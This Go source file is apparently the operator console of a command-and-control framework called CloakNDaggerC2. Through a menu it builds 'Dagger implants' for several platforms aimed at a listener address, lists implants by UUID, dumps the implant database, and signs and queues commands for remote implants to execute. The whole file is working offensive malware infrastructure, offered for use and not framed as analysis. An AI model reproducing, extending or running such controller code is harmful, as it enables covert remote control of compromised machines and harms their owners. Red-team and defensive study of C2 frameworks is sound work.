/*
Need to:
Provide interaction with beacons through the API like setting commmands
-This is done in our examples already
Provide the abiilty to interact with the generator
-This is also done in the examples
We need to be able to sign messages
-Verifying the signature is already done in the implant, so how hard is it to generate a signature?
Start all the gRPC servers and make them ready for data
Start the listeners as needed, perhaps with the option to point to a cert of our choosing and port
-They should then be able to list all running listeners
*/

package main

import (
	// go mod init dagger/proto/daggerProto - which led to the duplicate import
	"context"
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"strings"
	"time"

	pb "CloakNDaggerC2/dagger/proto/daggerProto"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

type impInfo struct {
	UUID        string
	Whoami      string
	Signature   string
	Retrieved   int32
	Command     string
	LastCheckIn string
	Result      string
	GotIt       int32
}

func sign(command string) (string, error) {
	KeyPEM, err := ioutil.ReadFile("../global.pem")

	PEMBlock, _ := pem.Decode([]byte(KeyPEM))
	if PEMBlock == nil {
		err := errors.New("Could not parse Private Key PEM")
		return "", err
	}

	key, err := x509.ParsePKCS1PrivateKey(PEMBlock.Bytes)

	toSign := []byte(command)
	hashed := sha256.Sum256(toSign)

	byte_sig, err := rsa.SignPKCS1v15(rand.Reader, key, crypto.SHA256, hashed[:])
	// We need to b64 encode this sig now

	if err != nil {
		return "", err
	}

	sig := base64.StdEncoding.EncodeToString(byte_sig)

	return sig, nil

}

func set(command, uuid, signature string) (int32, error) {
	conn, err := grpc.Dial("localhost:50055", grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
	if err != nil {
		log.Fatalf("did not connect : %v", err)
	}

	defer conn.Close()

	c := pb.NewUpdateRecordClient(conn)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)

	defer cancel()

	data := impInfo{
		// The issue I'm envisioning, I want to preserve the whoami and lastcheckin vals
		// In Python I was just running native DB queries and saving those vals to vars
		// With the API this will be more intensive and cumbersome
		// Right now we're ignoring the problem
		UUID: uuid, Whoami: "", Signature: signature, Retrieved: 0, Command: command, LastCheckIn: "", Result: "", GotIt: 0,
	}

	res, err := c.SendUpdate(ctx, &pb.UpdateObject{UUID: data.UUID, Whoami: data.Whoami, Signature: data.Signature,
		Retrieved: data.Retrieved, Command: data.Command, LastCheckIn: data.LastCheckIn, Result: data.Result,
		GotIt: data.GotIt})

	code := res.GetCode()

	if err != nil {
		return code, err
	}

	return code, nil

}

func dumpDB(UUID string) ([]string, error) {
	conn, err := grpc.Dial("localhost:50055", grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
	if err != nil {
		return nil, err
	}

	defer conn.Close()

	c := pb.NewGetAllClient(conn)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)

	defer cancel()

	results, err := c.GetAll(ctx, &pb.GetKey{Key: UUID})

	if err != nil {
		return nil, err
	}

	return results.Res, nil
}

func UUID_info(UUID string) (impInfo, error) {
	// Takes a UUID as a string
	// Returns either an empty struct and error or a full struct and no error
	conn, err := grpc.Dial("localhost:50055", grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
	if err != nil {
		return impInfo{}, err
	}

	defer conn.Close()

	c := pb.NewHgetRecordClient(conn)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)

	defer cancel()

	res, err := c.Hget(ctx, &pb.GetUUID{UUID: UUID})

	if err != nil {
		return impInfo{}, err
	}
	return impInfo{UUID: UUID,
		Whoami:      res.Whoami,
		Signature:   res.Signature,
		Retrieved:   res.Retrieved,
		Command:     res.Command,
		LastCheckIn: res.LastCheckIn,
		Result:      res.Result,
		GotIt:       res.GotIt,
	}, nil

}

func build(platform, arch, name, listener string) (uint16, error) {
	fmt.Printf("Attempting to compile... \n")
	conn, err := grpc.Dial("localhost:50053", grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
	if err != nil {
		return 1, err
	}

	defer conn.Close()

	c := pb.NewBuilderClient(conn)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)

	defer cancel()
	res, err := c.StartBuilding(ctx, &pb.BuildRoutine{Platform: platform, Architecture: arch, Name: name, ListenerAddress: listener})

	if err != nil {
		return 1, err
	}
	return uint16(res.GetCode()), nil
}

func main() {
	red := "\033[31m"
	green := "\033[32m"
	yellow := "\033[33m"
	blue := "\033[34m"
	reset := "\033[0m"
	for {
		var input string
		for {
			fmt.Printf("%sDagger controller home menu \n%s", yellow, reset)
			fmt.Printf("Type help for the info menu \n")
			fmt.Printf("%scontroller > %s", blue, reset)
			fmt.Scan(&input)
			input = strings.ToLower(input)

			switch input {
			case "1":
				var platform, arch, name, listener string
				fmt.Printf("Build menu \n")
				fmt.Printf("This menu allows you to build a Dagger implant \n")
				fmt.Printf("Type exit and hit return to leave at any time \n")
				fmt.Printf("The builder expects, in order, the platform to compile for, the architecture, the output file name, and the listener address and port to use \n")
				fmt.Printf("windows amd64 example https://test.culbertreport:8000 \n")
				fmt.Printf("%sBuilder > %s", red, reset)
				fmt.Scan(&platform, &arch, &name, &listener)
				platform = strings.ToLower(platform)
				arch = strings.ToLower(arch)
				name = strings.ToLower(name)
				listener = strings.ToLower(listener)
				switch platform {
				case "windows", "linux", "darwin":
					res, err := build(platform, arch, name, listener)
					fmt.Println(res, err)
				case "exit":
					fmt.Printf("Returning to the controller \n")
					break
				default:
					fmt.Printf("The builder expects, in order, the platform to compile for, the architecture, the output file name, and the listener address to use \n")
					fmt.Printf("windows amd64 example https://test.culbertreport:8000 \n")
					fmt.Printf("Type exit and hit return to leave at any time \n")
				}

			case "2":
				var uuid string
				fmt.Printf("Implant control menu \n")
				fmt.Printf("Here's where you can interact with all your fun implants \n")
				fmt.Printf("You just need to know the UUID to get started \n")
				fmt.Printf("Type exit and hit return to leave at any time \n")
				fmt.Printf("%sUUID > %s", green, reset)
				fmt.Scan(&uuid)
				uuid = strings.ToLower(uuid)
				// We don't know what to expect for the UUID so we need to look it up and then determine the case
				_, err := UUID_info(uuid)
				// We check if it exists and, if not, then we break out of the loop
				// err should be nil if the UUID exists
				if err != nil {
					fmt.Printf("The UUID does not exist, double check how you entered it: error %s \n", err)
					fmt.Printf("The control menu needs a UUID to find the implant you want to interact with \n")
					fmt.Printf("Type exit and hit return to leave at any time \n")
					break
				}
				// We should also add a field for the sleep timer so that way we can guess when the implant will check in
				// Based on the lastCheckIn var
				switch uuid {
				case "exit":
					fmt.Printf("Returning to the controller \n")
					break
				default:
					res, err := UUID_info(uuid)
					if err != nil {
						fmt.Println(err)
					}
					fmt.Printf("The last command issued was: %s\n", res.Command)
					fmt.Printf("The result of that was: %s\n", res.Result)

				}

			case "3":
				var key string
				fmt.Printf("Lists all implants and deets \n")
				fmt.Printf("Just need the key to search for, in most cases this will be UUID \n")
				fmt.Printf("Type exit and hit return to leave at any time \n")
				fmt.Printf("%sKey > %s", green, reset)
				fmt.Scan(&key)
				key = strings.ToLower(key)
				switch key {
				case "exit":
					break
				default:
					key = strings.ToUpper(key)
					res, err := dumpDB(key)
					if err != nil {
						fmt.Print(err)
					}
					fmt.Println(res)
				}

			case "4":
				// Need to get a signature
				// Need to set that signature and command
				// Need to then wait for the listener to update the db that the command was retrieved
				// Then display the output
				var cmd, uuid string
				fmt.Printf("This is the menu for interacting with implants \n")
				fmt.Printf("This requires an implant ID to assign the command to \n")
				fmt.Printf("Once you've specified an implant ID, you then can enter in your command \n")
				fmt.Printf("Type exit and hit enter at any time to leave at any time \n")
				fmt.Printf("%sEnter the target implant UUID > %s", red, reset)
				fmt.Scan(&uuid)
				uuid = strings.ToLower(uuid)
				if uuid == "exit" {
					break
				}
				fmt.Printf("%sEnter the command you want executed > %s", red, reset)
				fmt.Scan(&cmd)
				cmd = strings.ToLower(cmd)
				if cmd == "exit" {
					break
				}
				sig, err := sign(cmd)
				if err != nil {
					fmt.Print(err)
				}
				res, err := set(cmd, uuid, sig)
				if res != 0 || err != nil {
					fmt.Print(err)
				}
				fmt.Printf("Command set \n")

			case "help":
				fmt.Printf("Help menu \n")
				fmt.Printf("The interpreter expects 1 - 4 as commands \n")
				fmt.Printf("1 will bring you to the build menu where you can build an implant \n")
				fmt.Printf("2 will bring you to the implant info menu where you can find the last command run and the result \n")
				fmt.Printf("3 will you to list all implants in the DB \n")
				fmt.Printf("4 allows you to interact with implants by setting commands \n")
				fmt.Printf("5 will let you start a listener on an address and port combo \n")
				fmt.Printf("'help' will bring you to this menu \n")

			default:
				fmt.Printf("Help menu \n")
				fmt.Printf("The interpreter expects 1 - 4 as commands \n")
				fmt.Printf("1 will bring you to the build menu where you can build an implant \n")
				fmt.Printf("2 will bring you to the implant info menu where you can find the last command run and the result \n")
				fmt.Printf("3 will you to list all implants in the DB \n")
				fmt.Printf("4 allows you to interact with implants by setting commands \n")
				fmt.Printf("5 will let you start a listener on an address and port combo \n")
				fmt.Printf("'help' will bring you to this menu \n")
			}
		}
	}

}
